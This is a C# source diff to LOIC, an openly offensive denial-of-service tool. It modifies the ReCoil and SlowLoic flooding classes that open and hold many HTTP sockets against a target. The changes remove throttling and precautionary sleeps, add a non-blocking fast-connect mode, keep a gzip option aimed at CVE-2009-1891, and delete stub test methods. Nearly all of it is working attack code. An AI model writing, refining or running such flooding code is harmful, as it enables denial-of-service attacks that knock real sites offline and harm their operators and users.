@@ -28,7 +28,7 @@ namespace LOIC
         /// Shows if all possible sockets are build. 
         /// TRUE as long as the maximum amount of sockets is NOT reached.
         /// </summary>
-        public bool IsDelayed { get; set; } // don't spawn new threads until the last one reached the full capacity!!
+        public bool IsDelayed { get; set; } 
 
         /// <summary>
         /// Amount of send requests.
@@ -62,6 +62,7 @@ namespace LOIC
         public virtual void stop()
         {
             IsFlooding = false;
+            IsDelayed = true;
         }
 
         // override this if you want to test the settings before spreading the word to the hivemind!
@@ -112,6 +113,7 @@ namespace LOIC
         private string _subSite;
         private bool _random;
         private bool _usegZip;
+        private bool _resp;
 
         private int _nSockets;
         private List<Socket> _lSockets  = new List<Socket>();
@@ -128,7 +130,7 @@ namespace LOIC
         /// <param name="random">adds a random string to the subsite so that every new connection requests a new file. (use on searchsites or to bypass the cache / proxy)</param>
         /// <param name="nSockets">the amount of sockets for this object</param>
         /// <param name="usegZip">turns on the gzip / deflate header to check for: CVE-2009-1891 - keep in mind, that the compressed file still has to be larger than ~24KB! (maybe use on large static files like pdf etc?)</param>
-        public ReCoil(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, int nSockets, bool usegZip)
+        public ReCoil(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, bool resp, int nSockets, bool usegZip)
 		{
             this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
 			this._ip = ip;
@@ -146,6 +148,7 @@ namespace LOIC
 			this.Delay = delay+1;
             this._random = random;
             this._usegZip = usegZip;
+            this._resp = resp;
             IsDelayed = true;
             Requested = 0; // we reset this! - meaning of this counter changes in this context!
  		}
@@ -177,15 +180,15 @@ namespace LOIC
                     stop = DateTime.Now.AddMilliseconds(Timeout);
                     State = ReqState.Connecting; // SET STATE TO CONNECTING //
 
-                    // we have to do this really slow 
+                    // forget about slow! .. we have enough saveguards in place!
                     while (IsDelayed && (DateTime.Now < stop))
                     {
                         var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         socket.ReceiveBufferSize = bsize;
-                        socket.Blocking = true;
                         try
                         {
                             socket.Connect(((_ip == "") ? _dns : _ip), _port);
+                            socket.Blocking = _resp; // beware of shitstorm of 10035 - 10037 errors o.O
                             if (_random == true)
                             {
                                 sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}{4}{2}", _subSite, new Functions().RandomString(), Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
@@ -193,76 +196,81 @@ namespace LOIC
                             socket.Send(sbuf);
                         }
                         catch
-                        { }
+                        {
+                            ;
+                        }
 
                         if (socket.Connected)
                         {
-                            bool keeps = false;
-                            do
-                            { // some damn fail checks (and resolving dynamic redirects -.-)
-                                if (redirect != "")
-                                {
-                                    if (!socket.Connected)
+                            bool keeps = !_resp;
+                            if (_resp)
+                            {
+                                do
+                                { // some damn fail checks (and resolving dynamic redirects -.-)
+                                    if (redirect != "")
                                     {
-                                        socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                                        socket.Connect(((_ip == "") ? _dns : _ip), _port);
-                                    }
-                                    sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", redirect, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
-                                    socket.Send(sbuf);
-                                    redirect = "";
-                                }
-                                keeps = false;
-                                try
-                                {
-                                    string header = "";
-                                    while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
-                                    {
-                                        header += System.Text.Encoding.ASCII.GetString(rbuf);
-                                    }
-                                    string[] sp = header.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
-                                    string[] tsp;
-                                    for (int i = (sp.Length - 1); i >= 0; i--)
-                                    {
-                                        tsp = sp[i].Split(':');
-                                        if ((tsp[0] == "Content-Length") && (tsp.Length >= 2))
+                                        if (!socket.Connected)
                                         {
-                                            int sl = 0;
-                                            if (int.TryParse(tsp[1], out sl))
-                                            {
-                                                if (sl >= mincl)
+                                            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                                            socket.ReceiveBufferSize = bsize;
+                                            socket.Connect(((_ip == "") ? _dns : _ip), _port);
+                                        }
+                                        sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", redirect, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+                                        socket.Send(sbuf);
+                                        redirect = "";
+                                    }
+                                    keeps = false;
+                                    try
+                                    {
+                                        string header = "";
+                                        while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
+                                        {
+                                            header += System.Text.Encoding.ASCII.GetString(rbuf);
+                                        }
+                                        string[] sp = header.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
+                                        string[] tsp;
+                                        for (int i = (sp.Length - 1); i >= 0; i--)
+                                        {
+                                            tsp = sp[i].Split(':');
+                                            if ((tsp[0] == "Content-Length") && (tsp.Length >= 2))
+                                            { // checking if the content-length is long enough to work with this!
+                                                int sl = 0;
+                                                if (int.TryParse(tsp[1], out sl))
                                                 {
-                                                    keeps = true;
-                                                    i = -1;
+                                                    if (sl >= mincl)
+                                                    {
+                                                        keeps = true;
+                                                        i = -1;
+                                                    }
                                                 }
                                             }
-                                        }
-                                        else if ((tsp[0] == "Transfer-Encoding") && (tsp.Length >= 2) && (tsp[1].ToLower().Trim() == "chunked"))
-                                        {
-                                            keeps = true; //well, what doo?
-                                            i = -1;
-                                        }
-                                        else if ((tsp[0] == "Location") && (tsp.Length >= 2))
-                                        {
-                                            redirect = tsp[1].Trim();
-                                            i = -1;
+                                            else if ((tsp[0] == "Transfer-Encoding") && (tsp.Length >= 2) && (tsp[1].ToLower().Trim() == "chunked"))
+                                            {
+                                                keeps = true; //well, what doo?
+                                                i = -1;
+                                            }
+                                            else if ((tsp[0] == "Location") && (tsp.Length >= 2))
+                                            { // follow the redirect
+                                                redirect = tsp[1].Trim();
+                                                i = -1;
+                                            }
                                         }
                                     }
-                                }
-                                catch 
-                                {
-                                    ;
-                                }
-                            } while ((redirect != "") && (DateTime.Now < stop));
+                                    catch
+                                    { }
+                                } while ((redirect != "") && (DateTime.Now < stop));
 
+                                if (!keeps)
+                                    Failed++;
+                            }
                             if (keeps)
                             {
-                                _lSockets.Add(socket);
+                                socket.Blocking = true; // we rely on this in the dl-loop!
+                                _lSockets.Insert(0, socket);
                                 Requested++;
                             }
-                            else
-                                Failed++;
 
-                            if (_lSockets.Count < _nSockets)
+                            if ((_lSockets.Count < _nSockets) && (Delay > 0))
                             {
                                 System.Threading.Thread.Sleep(Delay);
                             }
@@ -270,7 +278,6 @@ namespace LOIC
                         if (_lSockets.Count >= _nSockets)
                         {
                             IsDelayed = false;
-                            System.Threading.Thread.Sleep(Delay * 10); // just a precaution 
                         }
                     }
 
@@ -291,7 +298,7 @@ namespace LOIC
                             }
                             else
                             {
-                                Downloaded++; // this number is actually BS .. but we wanna see sth happen :D
+                                Downloaded++; 
                             }
                         }
                         catch
@@ -302,10 +309,10 @@ namespace LOIC
                         }
                     }
 
+                    State = ReqState.Completed;
                     IsDelayed = (_lSockets.Count < _nSockets);
                     if (!IsDelayed)
                     {
-                        State = ReqState.Completed;
                         System.Threading.Thread.Sleep(Timeout);
                     }
                 }
@@ -327,12 +334,9 @@ namespace LOIC
                     catch { }
                 }
                 _lSockets.Clear();
+                State = ReqState.Ready;
+                IsDelayed = true;
             }
-        }
-
-        public override bool test()
-        { // do the scouting on your own! o__O
-            return true;
         }
     } // class ReCoil
 
@@ -383,7 +387,7 @@ namespace LOIC
 			{
 				this.Timeout = timeout * 1000;
 			}
-			this.Delay = delay+1;
+			this.Delay = delay;
             this._random = random;
             this._randcmds = randcmds;
             this._useget = useGet;
@@ -428,8 +432,8 @@ namespace LOIC
                         {
                             socket.Connect(((_ip == "") ? _dns : _ip), _port);
                             socket.NoDelay = true;
-                            socket.Send(sbuf);
                             socket.Blocking = false;
+                            socket.Send(sbuf);
                         }
                         catch
                         { }
@@ -438,7 +442,7 @@ namespace LOIC
                         {
                             _lSockets.Add(socket);
                             Requested++;
-                            if (_lSockets.Count < _nSockets)
+                            if ((_lSockets.Count < _nSockets) && (Delay > 0))
                             {
                                 System.Threading.Thread.Sleep(Delay);
                             }
@@ -498,13 +502,9 @@ namespace LOIC
                     catch { }
                 }
                 _lSockets.Clear();
+                State = ReqState.Ready;
+                IsDelayed = true;
             }
-        }
-
-
-        public override bool test()
-        { // do the scouting on your own!
-            return true;
         }
 
     } // class SlowLoic
